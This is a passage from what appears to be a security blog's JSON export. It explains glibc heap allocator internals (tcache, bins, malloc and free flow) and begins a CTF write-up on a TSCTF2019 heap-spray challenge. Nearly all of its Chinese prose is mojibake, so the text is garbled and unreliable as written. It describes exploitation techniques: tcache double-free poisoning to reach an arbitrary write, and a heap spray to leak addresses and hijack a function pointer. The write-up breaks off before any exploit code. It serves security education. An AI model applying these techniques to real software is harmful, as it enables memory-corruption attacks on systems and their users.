(size);\ntcache->counts[tc_idx]\n```\n\næ¥è®¿é—®ç´¢å¼•å¯¹åº”binçš„countã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-08_23-01-51.png)\n\nä»0x55555555b010è‡³0x55555555b04féƒ½æ˜¯countsè¿™ä¸ªæ•°ç»„çš„èŒƒå›´ã€‚\n\nâ–²ç”±äºä½¿ç”¨tcacheæ—¶ï¼Œä¸ä¼šæ£€æŸ¥tcache->counts[tc_idx]çš„å¤§å°æ˜¯å¦å¤„åœ¨[0,7]çš„èŒƒå›´ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥å°†å¯¹åº”binçš„countæ”¹æˆ[0,7]ä¹‹å¤–çš„æ•°ï¼Œè¿™æ ·ä¸‹å›å†freeè¯¥binå¯¹åº”å¤§å°çš„chunkæ—¶ï¼Œå°±ä¸ä¼šå°†è¯¥chunkç½®å…¥tcacheä¸­ï¼Œä½¿å¾—tcacheä¸æ»¡ä¹Ÿèƒ½ä¸è¿›å…¥tcacheã€‚\n\nB.entriesï¼šæ˜¯ä¸ªbinæŒ‡é’ˆæ•°ç»„ï¼Œå…±64ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œæ¯ä¸ªæŒ‡é’ˆ8ä¸ªå­—èŠ‚ï¼Œæ€»è®¡å¤§å°0x200å­—èŠ‚ï¼ŒæŒ‡é’ˆæŒ‡å‘å¯¹åº”çš„binä¸­ç¬¬ä¸€ä¸ªchunkçš„é¦–åœ°å€ï¼Œè¿™ä¸ªé¦–åœ°å€ä¸æ˜¯chunkå¤´çš„é¦–åœ°å€ï¼Œè€Œæ˜¯å¯¹åº”æ•°æ®çš„é¦–åœ°å€ã€‚å¦‚æœè¯¥binä¸ºç©ºï¼Œåˆ™è¯¥æŒ‡é’ˆä¹Ÿä¸ºç©ºã€‚ä¸€èˆ¬ä¼šä½¿ç”¨tcache->entries[tc_idx] != NULLæ¥åˆ¤æ–­æ˜¯å¦ä¸ºç©ºã€‚\n\n \n\n#### â‘¡2.29åŠä»¥ä¸Š\n\nåœ¨entryä¸­å¢åŠ äº†keyå­—æ®µï¼Œç»“æ„ä½“å¤§å°ä¸º0x290ï¼Œcountç”±åŸæ¥çš„ä¸€ä¸ªå­—èŠ‚å˜ä¸ºä¸¤ä¸ªå­—èŠ‚\n\n```c\n#æ³¨é‡Šå¤´\n\ntypedef struct tcache_entry\n{\n  struct tcache_entry *next;\n  /* This field exists to detect double frees.  */\n  struct tcache_perthread_struct *key; /* æ–°å¢æŒ‡é’ˆ */\n} tcache_entry;\n```\n\n### (2)ä¸ªæ•°\n\nç±»ä¼¼äºä¸€ä¸ªæ¯”è¾ƒå¤§çš„fastbinsã€‚æ€»å…±64ä¸ªbinã€‚\n\n### (3)å½’ç±»æ–¹å¼ï¼š\n\nç›¸åŒå¤§å°çš„chunkå½’åˆ°ä¸€ç±»ï¼šå¤§å°èŒƒå›´[0x20,0x410]ã€‚æ¯ç»„binsä¸­çš„chunkå¤§å°ä¸€å®šã€‚ä¸”ä¸€ç»„binä¸­æœ€å¤šåªèƒ½æœ‰7ä¸ªchunkï¼Œå¦‚æœfreeæŸå¤§å°binçš„chunkæ•°é‡è¶…è¿‡7ï¼Œé‚£ä¹ˆå¤šä½™çš„chunkä¼šæŒ‰ç…§æ²¡æœ‰tcacheæœºåˆ¶æ¥freeã€‚\n\n### (4)å•å‘é“¾è¡¨ï¼š\n\nâ–²ä¾‹å­ï¼ša=malloc(0x10); b=malloc(0x10); c=malloc(0x10); d=malloc(0x10)\n\nFastbinY,d,c,b,a\n\n- free(a)ä¹‹åï¼štcachebins[0x20]->a;  a.fd=0\n\n- free(b)ä¹‹åï¼štcachebins[0x20]->b;  b.fd=a   a.fd=0\n\n- free(c)ä¹‹åï¼štcachebins[0x20]->c;  c.fd=b    b.fd->a;  a.fd=0\n\n- free(d)ä¹‹åï¼štcachebins[0x20]->d;  d.fd=c    c.fd->b;  b.fd->a;  a.fd=0\n\nâ˜…ä½†æ˜¯è¿™é‡Œçš„fdæŒ‡å‘çš„æ˜¯chunkå†…å®¹åœ°å€ï¼Œè€Œä¸æ˜¯å…¶å®ƒçš„binsä¸­çš„fdæŒ‡å‘çš„æ˜¯chunkå¤´åœ°å€ã€‚\n\n### (5)åè¿›å…ˆå‡º\n\nä¸fastbinsç±»ä¼¼ã€‚ä¸”tcacheçš„ä¼˜å…ˆçº§æœ€é«˜ã€‚\n\n### (6)ç‰¹æ®Šï¼š\n\n- å½“tcacheæŸä¸ªbinè¢«å¡«æ»¡ä¹‹åï¼Œå†freeç›¸åŒå¤§å°çš„binæ”¾åˆ°fastbinä¸­æˆ–è€…smallbinsä¸­ï¼Œä¹‹åè¿ç»­ç”³è¯·7ä¸ªè¯¥å¤§å°çš„chunkï¼Œé‚£ä¹ˆtcacheä¸­çš„è¿™ä¸ªbinå°±ä¼šè¢«æ¸…ç©ºã€‚ä¹‹åå†ç”³è¯·è¯¥å¤§å°çš„chunkå°±ä¼šä»fastbinsæˆ–è€…smallbinsä¸­æ‰¾ï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œé‚£ä¹ˆè¿”å›è¯¥chunkçš„åŒæ—¶ï¼Œä¼šå°†è¯¥å¤§å°çš„fastbinæˆ–è€…smallbinä¸­æ‰€æœ‰çš„chunkéƒ½ç§»åŠ¨åˆ°å¯¹åº”å¤§å°çš„tcacheçš„binä¸­ï¼Œç›´è‡³å¡«æ»¡7ä¸ªã€‚(ç§»åŠ¨æ—¶ä»æ—§éµå¾ªå…ˆè¿›åå‡ºçš„åŸåˆ™ï¼Œæ‰€ä»¥ç§»åŠ¨ä¹‹åchunké¡ºåºä¼šå‘ç”Ÿé¢ å€’)\n\n- libc-2.26ä¸­å­˜åœ¨tcache poisoningæ¼æ´ï¼Œå³å¯ä»¥è¿ç»­free(chunk)å¤šæ¬¡ã€‚\n\nå‡å¦‚chunk0,chunk1ï¼Œç„¶åfree(chunk0)ä¸¤æ¬¡ï¼Œè¿™æ ·tcache binä¸­å°±æ˜¯ï¼š\n\n```\nchunk0.fd ->chunk0ï¼Œå³chunk0->chunk0\n```\n\né‚£ä¹ˆç¬¬ä¸€æ¬¡ç”³è¯·å›chunk0ï¼Œä¿®æ”¹fdä¸ºfakechunkï¼Œtcache binä¸­å°±æ˜¯ï¼š\n\n```\nchunk0.fd->fakechunkï¼Œå³chunk0->fakechunk\n```\n\nä¹‹åå†ç”³è¯·å›chunk0ï¼Œå†ç”³è¯·ä¸€æ¬¡å°±æ˜¯fakechunkäº†ï¼Œå®ç°ä»»æ„åœ°å€ä¿®æ”¹ã€‚\n\nâ˜…è¿™ä¸ªæ¼æ´åœ¨libc2.27ä¸­å°±è¢«ä¿®å¤äº†ã€‚\n\n- ä»tcacheä¸­ç”³è¯·Chunkçš„æ—¶å€™ä¸ä¼šæ£€æŸ¥sizeä½ï¼Œä¸éœ€è¦æ„é€ å­—èŠ‚é”™ä½ã€‚\n\n### (7)2.31ä¸‹æ–°å¢stashæœºåˆ¶ï¼š\n\nåœ¨ Fastbins å¤„ç†è¿‡ç¨‹ä¸­æ–°å¢äº†ä¸€ä¸ª Stash æœºåˆ¶ï¼Œæ¯æ¬¡ä» Fastbins å– Chunk çš„æ—¶å€™ä¼šæŠŠå‰©ä¸‹çš„ Chunk å…¨éƒ¨ä¾æ¬¡æ”¾è¿›å¯¹åº”çš„ tcacheï¼Œç›´åˆ° Fastbins ç©ºæˆ–æ˜¯ tcache æ»¡ã€‚\n\n### (8)2.32ä¸‹æ–°å¢fdå¼‚æˆ–æœºåˆ¶ï¼š\n\nä¼šå°†fdå¼‚æˆ–ä¸ŠæŸä¸ªå€¼ï¼Œè¿™ä¸ªå…·ä½“çœ‹å…¶ä»–æ–‡ç« å§ã€‚\n\n \n\n \n\n \n\n## 6.Topchunk:\n\nä¸å±äºä»»ä½•Binï¼Œåœ¨arenaä¸­å±äºæœ€é«˜åœ°å€ï¼Œæ²¡æœ‰å…¶å®ƒç©ºé—²å—æ—¶ï¼Œtopchunkå°±ä¼šè¢«ç”¨äºåˆ†é…ã€‚\n\n \n\n \n\n## 7.last_remainder:\n\nå½“è¯·æ±‚small chunkå¤§å°å†…å­˜æ—¶ï¼Œå¦‚æœå‘ç”Ÿåˆ†è£‚ï¼Œåˆ™å‰©ä½™çš„chunkä¿å­˜ä¸ºlast_remainderï¼Œæ”¾å…¥unsortedbinä¸­ã€‚\n\n \n\n \n\n\n\nâ–²æ²¡æœ‰tcacheçš„mallocå’Œfreeæµç¨‹ï¼š\n\n# å››ã€mallocæµç¨‹ï¼š\n\nâ˜…å¦‚æœæ˜¯å¤šçº¿ç¨‹æƒ…å†µä¸‹ï¼Œé‚£ä¹ˆä¼šå…ˆè¿›è¡Œåˆ†é…åŒºçš„åŠ é”ï¼Œè¿™é‡Œå°±å¯èƒ½å­˜åœ¨æ¡ä»¶ç«äº‰æ¼æ´ã€‚\n\n- å¦‚æœsizeåœ¨fastbinsçš„èŒƒå›´å†…ï¼Œåˆ™å…ˆåœ¨fastbinsä¸­æŸ¥æ‰¾ï¼Œæ‰¾åˆ°åˆ™ç»“æŸï¼Œæ²¡æ‰¾åˆ°å°±å»unsortedbinsä¸­æ‰¾ã€‚\n\n- å¦‚æœsizeä¸åœ¨fastbinsèŒƒå›´ä¸­ï¼Œè€Œåœ¨smallbinsèŒƒå›´ä¸­ï¼Œåˆ™æŸ¥æ‰¾smallbinsï¼ˆåœ¨2.23ä¸‹å¦‚æœå‘ç°smallbiné“¾è¡¨æœªåˆå§‹åŒ–ï¼Œåˆ™ä¼šè°ƒç”¨**malloc_consolidate**å‡½æ•°ï¼Œä½†æ˜¯å®é™…æƒ…å†µåœ¨ç”³è¯·chunkä¹‹å‰éƒ½å·²ç»åˆå§‹åŒ–è¿‡äº†ï¼Œæ‰€ä»¥è¿™ä¸ªä¸æ€ä¹ˆé‡è¦\n\n  ```\n  if (victim == 0) /* initialization check */ malloc_consolidate (av); \n  ```\n\n  è€Œä¸”è¿™ä¸ªæ“ä½œä»2.27å¼€å§‹å·²ç»æ²¡æœ‰äº†ï¼Œå¦‚æœèƒ½å¤Ÿè®©smallbinä¸åˆå§‹åŒ–ï¼Œæˆ–è€…å°†main_arena+0x88è®¾ç½®ä¸º0ï¼‰ï¼Œæ­¤æ—¶è‹¥smallbinæ‰¾åˆ°ç»“æŸï¼Œæ²¡æ‰¾åˆ°å»unsortedbinsä¸­æ‰¾\n\n- å¦‚æœsizeä¸åœ¨fastbinsï¼ŒsmallbinsèŒƒå›´ä¸­ï¼Œé‚£ä¸€å®šåœ¨largebinsä¸­ï¼Œé‚£ä¹ˆå…ˆè°ƒç”¨**malloc_consolidate**å‡½æ•°å°†æ‰€æœ‰çš„fastbinä¸­çš„chunkå–å‡ºæ¥ï¼Œåˆå¹¶ç›¸é‚»çš„freechunkï¼Œæ”¾åˆ°unsortedbinä¸­ï¼Œæˆ–è€…ä¸topchunkåˆå¹¶ã€‚å†å»largebinsä¸­æ‰¾ï¼Œæ‰¾åˆ°ç»“æŸï¼Œæ²¡æ‰¾åˆ°å°±å»unsortedbinsä¸­æ‰¾ã€‚\n\n- unsortedbinsä¸­æŸ¥æ‰¾ï¼š\n  - å¦‚æœunsortedbinä¸­åªæœ‰last_reaminderï¼Œä¸”åˆ†é…çš„sizeå°äºlast_remainderï¼Œä¸”è¦æ±‚çš„sizeèŒƒå›´ä¸ºsmallbinçš„èŒƒå›´ï¼Œåˆ™åˆ†è£‚ï¼Œå°†åˆ†è£‚ä¹‹åçš„ä¸€ä¸ªåˆé€‚çš„chunkç»™ç”¨æˆ·ï¼Œå‰©ä½™çš„chunkå˜æˆæ–°çš„last_remainderè¿›å…¥unsortedbinä¸­ã€‚å¦‚æœå¤§äºlast_remainderï¼Œæˆ–è€…åˆ†é…çš„sizeèŒƒå›´ä¸ºlargebinçš„èŒƒå›´ï¼Œåˆ™å°†last_remainderæ•´ç†è‡³å¯¹åº”binä¸­ï¼Œè·³è‡³ç¬¬5æ­¥ã€‚\n  - å¦‚æœunsortedbinä¸­ä¸åªä¸€ä¸ªchunkï¼Œåˆ™å…ˆæ•´ç†ï¼Œéå†unsortedbinsã€‚å¦‚æœé‡åˆ°ç²¾ç¡®å¤§å°ï¼Œç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œæ¥ç€æ•´ç†å®Œã€‚å¦‚æœä¸€ç›´æ²¡é‡åˆ°è¿‡ï¼Œåˆ™è¯¥è¿‡ç¨‹ä¸­æ‰€æœ‰é‡åˆ°çš„chunkéƒ½ä¼šè¢«æ•´ç†åˆ°å¯¹åº”çš„fastbinsï¼Œsmallbinsï¼Œlargebinsä¸­å»ã€‚\n\n- unsortedbinsä¸­æ‰¾ä¸åˆ°ï¼Œåˆ™ï¼š\n  - è‹¥å½“å‰sizeæœ€å¼€å§‹åˆ¤æ–­æ˜¯å¤„äºsmallbinsèŒƒå›´å†…ï¼Œåˆ™å†å»smallbinsæ‰¾ï¼Œè¿™å›ä¸æ‰¾ç²¾ç¡®å¤§å°ï¼Œæ‰¾æœ€æ¥è¿‘ç•¥å¤§äºsizeçš„ä¸€ä¸ªå›ºå®šå¤§å°çš„chunkç»™åˆ†è£‚ï¼Œå°†ç¬¦åˆsizeçš„chunkè¿”å›ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„æ‰”ç»™unsortedbinsï¼Œä½œä¸ºæ–°çš„last_remainderã€‚\n  - è‹¥å½“å‰sizeæœ€å¼€å§‹åˆ¤æ–­å¤„äºlargebinsèŒƒå›´å†…ï¼Œåˆ™å»largebinsä¸­æ‰¾ï¼Œå’Œæ­¥éª¤(1)ç±»ä¼¼ã€‚\n  - è‹¥å½“å‰sizeå¤§äºlargebinsä¸­æœ€å¤§çš„chunkå¤§å°ï¼Œé‚£ä¹ˆå°±å»topchunkæ¥åˆ†å‰²ä½¿ç”¨ã€‚\n\n- topchunkåˆ†å‰²ï¼š\n  - topchunkç©ºé—´å¤Ÿï¼Œåˆ™ç›´æ¥åˆ†å‰²ã€‚\n  - topchunkç©ºé—´ä¸å¤Ÿï¼Œé‚£ä¹ˆå†è°ƒç”¨malloc_consolidateå‡½æ•°è¿›è¡Œæ•´ç†ä¸€ä¸‹ï¼Œç„¶ååˆ©ç”¨brkæˆ–è€…mmapè¿›è¡Œå†æ‹“å±•ã€‚\n    - brkæ‰©å±•ï¼šå½“ç”³è¯·çš„sizeå°äº128Kæ—¶ï¼Œä½¿ç”¨è¯¥æ‰©å±•ã€‚å‘é«˜åœ°å€æ‹“å±•æ–°çš„topchunkï¼Œä¸€èˆ¬åŠ 0x21000ï¼Œä¹‹åä»æ–°çš„topchunkå†åˆ†é…ï¼Œæ—§çš„topchunè¿›å…¥unsortedbinä¸­ã€‚\n    - mmapæ‰©å±•ï¼šç”³è¯·çš„sizeå¤§äºç­‰äºmmapåˆ†é…é˜ˆå€¼(æœ€å¼€å§‹ä¸º128k)æ—¶ï¼Œä½¿ç”¨è¯¥æ‰©å±•ï¼Œä½†æ˜¯è¿™ç§æ‰©å±•ç”³è¯·åˆ°çš„chunkï¼Œåœ¨é‡Šæ”¾æ—¶ä¼šè°ƒç”¨munmapå‡½æ•°ç›´æ¥è¢«è¿”å›ç»™æ“ä½œç³»ç»Ÿï¼Œè€Œä¸ä¼šè¿›å…¥binsä¸­ã€‚æ‰€ä»¥å¦‚æœç”¨æŒ‡é’ˆå†å¼•ç”¨è¯¥chunkå—æ—¶ï¼Œå°±ä¼šé€ æˆsegmentation faulté”™è¯¯ã€‚\n\nâ–²å½“ptmalloc munmap chunkæ—¶ï¼Œå¦‚æœå›æ”¶çš„chunkç©ºé—´å¤§å°å¤§äºmmapåˆ†é…é˜ˆå€¼çš„å½“å‰å€¼ï¼Œå¹¶ä¸”å°äºDEFAULT_MMAP_THRESHOLD_MAXï¼ˆ32ä½ç³»ç»Ÿé»˜è®¤ä¸º512KBï¼Œ64ä½ç³»ç»Ÿé»˜è®¤ä¸º32MBï¼‰ï¼Œptmallocä¼šæŠŠmmapåˆ†é…é˜ˆå€¼è°ƒæ•´ä¸ºå½“å‰å›æ”¶çš„chunkçš„å¤§å°ï¼Œå¹¶å°†mmapæ”¶ç¼©é˜ˆå€¼ï¼ˆmmap trim thresholdï¼‰è®¾ç½®ä¸ºmmapåˆ†é…é˜ˆå€¼çš„2å€ã€‚è¿™å°±æ˜¯ptmallocçš„å¯¹mmapåˆ†é…é˜ˆå€¼çš„åŠ¨æ€è°ƒæ•´æœºåˆ¶ï¼Œè¯¥æœºåˆ¶æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨mallopt()å…³é—­è¯¥æœºåˆ¶\n\nâ–²å¦‚æœå°† M_MMAP_MAX è®¾ç½®ä¸º 0ï¼Œptmalloc å°†ä¸ä¼šä½¿ç”¨ mmap åˆ†é…å¤§å—å†…å­˜ã€‚\n\n \n\n# äº”ã€freeæµç¨‹ï¼š\n\nâ˜…å¤šçº¿ç¨‹æƒ…å†µä¸‹ï¼Œfree()å‡½æ•°åŒæ ·é¦–å…ˆéœ€è¦è·å–åˆ†é…åŒºçš„é”ï¼Œæ¥ä¿è¯çº¿ç¨‹å®‰å…¨ã€‚\n\n- é¦–å…ˆåˆ¤æ–­è¯¥chunkæ˜¯å¦ä¸ºmmaped chunkï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è°ƒç”¨ munmap()é‡Šæ”¾mmaped chunkï¼Œè§£é™¤å†…å­˜ç©ºé—´æ˜ å°„ï¼Œè¯¥è¯¥ç©ºé—´ä¸å†æœ‰æ•ˆã€‚åŒæ—¶æ»¡è¶³æ¡ä»¶åˆ™è°ƒæ•´mmapé˜ˆå€¼ã€‚\n\n- å¦‚æœsizeä½äºfastbinsèŒƒå›´å†…ï¼Œç›´æ¥æ”¾åˆ°fastbinsä¸­ã€‚\n\n- å¦‚æœsizeä¸åœ¨fastbinsèŒƒå›´å†…ï¼Œåˆ™è¿›è¡Œåˆ¤æ–­ï¼š\n  - å…ˆåˆ¤æ–­å‰ä¸€ä¸ªchunk_beforeï¼Œå¦‚æœchunk_beforeæ˜¯freeçŠ¶æ€çš„ï¼Œé‚£ä¹ˆå°±å°†å‰ä¸€ä¸ªchunkä»å…¶å¯¹åº”çš„binsä¸­å–å‡ºæ¥(unlink)ï¼Œç„¶ååˆå¹¶è¿™ä¸¤ä¸ªchunkå’Œchunk_beforeã€‚ç”±äºè¿˜æ²¡æœ‰è¿›å…¥é“¾è¡¨ç»“æ„ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œå¯»æ‰¾chunk_beforeåœ°å€æ˜¯é€šè¿‡å½“å‰åœ°å€å‡å»å½“å‰chunkçš„presizeå†…å®¹ï¼Œå¾—åˆ°chunk_beforeçš„åœ°å€ï¼Œä»è€Œè·å–å…¶in_useä½ã€‚\n  - è¿™ä¹Ÿæ˜¯presizeå”¯ä¸€çš„ç”¨é€”ï¼Œæ‰€ä»¥åœ¨å †æº¢å‡ºä¸­ï¼Œåªè¦ä¸è¿›è¡Œfreeï¼Œpresizeå¯ä»¥ä»»æ„ä¿®æ”¹ã€‚(è¿™é‡Œå¦‚æœchunk_beforeæ˜¯ä½äºfastbinsä¸­åˆ™æ²¡åŠæ³•åˆå¹¶ï¼Œå› ä¸ºåœ¨fastbinsä¸­çš„in_useä½ä¸ä¼šè¢«æ”¹å˜ï¼Œæ°¸è¿œæ˜¯1ï¼Œåœ¨åˆ¤æ–­æ—¶å§‹ç»ˆè®¤ä¸ºè¯¥chunkæ˜¯å¤„äºallocatedçŠ¶æ€çš„)\n  - å†åˆ¤æ–­åä¸€ä¸ªchunkï¼Œå¦‚æœåä¸€ä¸ªchunkæ˜¯freeçŠ¶æ€ï¼Œé‚£ä¹ˆå¦‚æ­¥éª¤(1)ï¼Œåˆå¹¶ï¼Œä¹‹åå°†åˆå¹¶å’Œçš„chunkæ”¾å…¥åˆ°unsortedbinsä¸­å»ã€‚å¦‚æœåä¸€ä¸ªchunkå°±æ˜¯topchunkï¼Œé‚£ä¹ˆç›´æ¥å°†è¿™ä¸ªchunkå’Œtopchunkåˆå¹¶å®Œäº‹ã€‚\n  - ä¹‹åå°†åˆå¹¶ä¹‹åçš„chunkè¿›è¡Œåˆ¤æ–­ï¼Œ(è¿™é‡Œä¹Ÿå¯èƒ½ä¸å‘ç”Ÿåˆå¹¶ï¼Œä½†ä¾æ—§ä¼šè¿›è¡Œåˆ¤æ–­)å¦‚æœsizeå¤§äº`FASTBIN_CONSOLIDATION_THRESHOLD`(0x10000)ï¼Œé‚£ä¹ˆå°±è°ƒç”¨**malloc_consolidate**å‡½æ•°è¿›è¡Œæ•´ç†fastbinsï¼Œç„¶åç»™åˆ°unsortedbinsä¸­ï¼Œç­‰å¾…mallocæ—¶è¿›è¡Œæ•´ç†ã€‚\n\n \n\nâ–²32ä½ä¸64ä½åŒºåˆ«ï¼Œå·®ä¸å¤šå…¶å®ï¼Œå¯¹äº0x8å’Œ0x10çš„å˜åŒ–è€Œå·²ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.jpg)\n","tags":["Heap-Knowledge"],"categories":["PWN","pwnå †"]},{"title":"TSCTF2019 è–›å®šè°”çš„å †å—-HeapSpray","url":"/2021/08/18/TSCTF2019 è–›å®šè°”çš„å †å—-HeapSpray/","content":"\nheapsprayæœ‰å¾ˆå¤šçš„åº”ç”¨åœºæ™¯ï¼Œä½†å¤§å¤šéƒ½æ˜¯windowsä¸‹çš„æ¼æ´åº”ç”¨ï¼Œå…³äºGlibcçš„æ¯”è¾ƒå°‘ï¼Œè‡³ä»Šåªçœ‹è§ä¸¤é¢˜ï¼š\n\n[pwnhub.cn æ•…äº‹çš„å¼€å§‹ calc](https://atum.li/2016/12/05/calc/)\n\n[TSCTF2019 è–›å®šè°”çš„å †å—](https://www.anquanke.com/post/id/206484)\n\nè¿™é‡Œå‚è€ƒç¬¬äºŒç¯‡æ–‡ç« é’ˆå¯¹ç¬¬äºŒé¢˜åšä¸ªå¤ç°ï¼Œç†è§£ä¸‹å †å–·çš„æ€æƒ³ã€‚\n\n## 1.å‡½æ•°ç†è§£\n\nè¿™é‡Œåˆ†æèµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œæœ€å¥½å°±è°ƒè¯•ï¼Œç›´æ¥ç»™å‡ºç›¸å…³çš„åŠŸèƒ½ï¼š\n\n### (1)Createå‡½æ•°ï¼š\n\n- åˆ›å»ºchunkï¼Œä½†æ¯æ¬¡Createä¼šåˆ›å»º0x10ä¸ªç›¸åŒå¤§å°çš„chunkï¼Œä¸”å¤§å°ä¸ºè¾“å…¥size+4ã€‚æ¯”å¦‚è¾“å…¥sizeä¸º0xcï¼Œé‚£ä¹ˆåˆ›å»ºçš„chunkå°±æ˜¯0x10ä¸ª0x18å¤§å°çš„Chunkã€‚åŒæ—¶æ¯0x10ä¸ªå°chunkåœ¨å®è§‚æ„ä¹‰ä¸Šç»„æˆä¸€ä¸ªå¤§chunkï¼Œè¿™é‡Œç”¨SmallChunkå’ŒBigChunkåŒºåˆ†ä¸€ä¸‹ã€‚\n\n- chunkçš„ç´¢å¼•åœ¨å…¨å±€æ•°ç»„dword_4060ï¼ŒchunkListä¸­éšæœºæ’åˆ—ï¼Œæ¯”å¦‚idxä¸º0çš„chunkä¸ä¸€å®šæ˜¯ç¬¬ä¸€ä¸ªåˆ›å»ºçš„ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-46-26.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-49-21.png)\n\nè¿™ç‚¹åœ¨åé¢å †å–·ä¼šç”¨åˆ°ï¼Œæ— æ³•ç®€å•åœ°é€šè¿‡æ‰“å°å€¼æ¥åˆ¤æ–­heapåœ°å€ï¼Œåªèƒ½åˆ¤æ–­å‡ºåœ¨å“ªä¸ªBigChunkä¸­ï¼Œè¿˜å¾—åˆ¤æ–­å‡ºæŸä¸ªSmallChunkåœ¨BigChunkä¸­çš„ä½ç½®æ‰èƒ½æ³„éœ²å‡ºå †åœ°å€ã€‚\n\n- åˆ›å»ºchunkè¯»å–æ•°æ®æ—¶read_strå‡½æ•°é‡Œæœ‰\\x00æˆªæ–­ï¼Œæ‰€ä»¥Displayåœ¨æ²¡æœ‰UAFçš„æƒ…å†µä¸‹éš¾ä»¥æ³„éœ²å‡ºåœ°å€ï¼Œè¿™é‡Œä¹Ÿä¸å­˜åœ¨å †æº¢å‡ºã€‚\n\n- é€‰æ‹©chunkç±»å‹æ—¶ä¼šç»™chunk_addr+sizeå¤„èµ‹å€¼ï¼Œè¿™é‡Œå°±æ˜¯ä¹‹å‰ç”³è¯·size+4çš„åŸå› ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-56-19.png)\n\nè¿™ä¸ªèµ‹äºˆçš„å€¼æ˜¯ä¸€ä¸ªELFä¸Šçš„dataæ•°æ®åœ°å€ï¼Œæ²¡å•¥ç”¨ï¼Œè¿·æƒ‘ç”¨çš„ï¼ŒåŒæ—¶å¦‚æœé€‰æ‹©çš„é€‰é¡¹ä¸ä¸º1-4çš„è¯ï¼Œå°±ä¼šä¸èµ‹å€¼ï¼Œè¿™ä¸ªåœ¨åé¢å¾ˆæœ‰ç”¨ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-58-56.png)\n\n### (2)Displayå‡½æ•°ï¼š\n\næ¯”è¾ƒå¸¸è§„ï¼Œè¾“å‡ºç»™å®šindexèŒƒå›´çš„SmallChunkçš„å†…å®¹\n\n### (3)Deleteå‡½æ•°ï¼š\n\nåˆ é™¤æœ€åä¸€æ¬¡Createçš„BigChunkçš„æ‰€æœ‰SmallChunkï¼Œfreeæ•°æ®ä¸”ç½®æŒ‡é’ˆNULLï¼Œæ²¡å•¥æ¼æ´ã€‚ä½†æ˜¯è¿™é‡Œåˆ é™¤æ˜¯ä¾æ®chunkListçš„é¡ºåºç´¢å¼•åˆ é™¤ï¼Œè€ŒchunkListåˆæ˜¯è¢«æ‰“ä¹±çš„ï¼Œæ‰€ä»¥åˆ é™¤ä¹‹åçš„é¡ºåºå…¶å®ä¸æ˜¯æˆ‘ä»¬æœ€å¼€å§‹è¾“å…¥æ•°æ®çš„é¡ºåºï¼Œè¿™ä¸ªåœ¨åé¢unsortedbinæ³„éœ²æ•°æ®çš„æ—¶å€™éœ€è¦æ³¨æ„ä¸€ä¸‹ã€‚\n\n### (4)Modifyå‡½æ•°ï¼š\n\nç¼–è¾‘æŒ‡å®šindexçš„Small Blockçš„å†…å®¹ï¼Œè¿™é‡Œæ²¡å•¥ç”¨\n\n### (5)CallFunctionå‡½æ•°ï¼š\n\næ ¹æ®Createæ—¶çš„æœ€åé‚£4byteçš„æ•°å€¼æ¥å†³å®šæ‰§ä¸æ‰§è¡ŒæŸä¸ªå‡½æ•°æŒ‡é’ˆ(è¿™ä¸ªå‡½æ•°æŒ‡é’ˆå°±æ˜¯æœ€å¼€å§‹åˆ›å»ºçš„æ—¶å€™èµ‹å€¼çš„ELFä¸Šçš„æ•°æ®)ã€‚\n\n- *(chunk_addr+size) != 0ï¼Œåˆ™set *(*(chunk_addr+size)) -= 1\n\n- *(chunk_addr+size) == 0ï¼Œåˆ™jmp *(*(chunk_addr+size))+0x4\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-06-41.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-07-14.png)\n\nè¿™é‡Œè°ƒç”¨CallFunctionå‡½æ•°ä¹‹åå°±å¯ä»¥è°ƒç”¨åˆ°0xf7e87401ï¼Œè¿™é‡Œçš„*0x57d1ab8cæ˜¯æˆ‘ä»¬åœ¨å †ä¸Šè®¾ç½®å¥½çš„å†…å®¹ã€‚\n\n## 2.æ¼æ´å‘ç°ï¼š\n\nè¿™é‡Œå°±ç»“åˆCreateå‡½æ•°ï¼Œåˆ©ç”¨å…ˆç”³è¯·å¡«å……å†…å®¹ä¹‹åå†é‡Šæ”¾ï¼Œä½¿å¾—`*(chunk_addr+size)`å¯æ§ï¼Œä»è€Œèƒ½å¤Ÿè°ƒç”¨ä»»æ„å‡½æ•°ã€‚ä½†æ˜¯åœ¨ä¿æŠ¤å…¨å¼€çš„æƒ…å†µä¸‹æƒ³è¦è°ƒç”¨å‡½æ•°ï¼Œå¿…é¡»éœ€è¦æ³„éœ²åœ°å€ï¼Œè€Œåœ°å€åœ¨æ²¡æœ‰æ¼æ´çš„æƒ…å†µä¸‹åˆæ²¡åŠæ³•æ³„éœ²ã€‚\n\nå †å–·åŸç†ï¼šhttps://www.cnblogs.com/Fang3s/articles/3911561.html\n\n### (1)å †å–·ç»“åˆCallFunctionå‡½æ•°çš„-1æ³„éœ²åœ°å€ï¼š\n\nå‡è®¾æŸä¸ªå †åœ°å€ï¼šmagic_addrã€‚ç”±äºè¿™é‡Œå¯ä»¥Displayï¼Œæ‰€ä»¥å¦‚æœ`*magic_addr= magic_addr-1`ï¼Œè€Œåˆ©ç”¨å †å–·ä½¿å¾—ä¸€å®šèŒƒå›´å†…çš„å 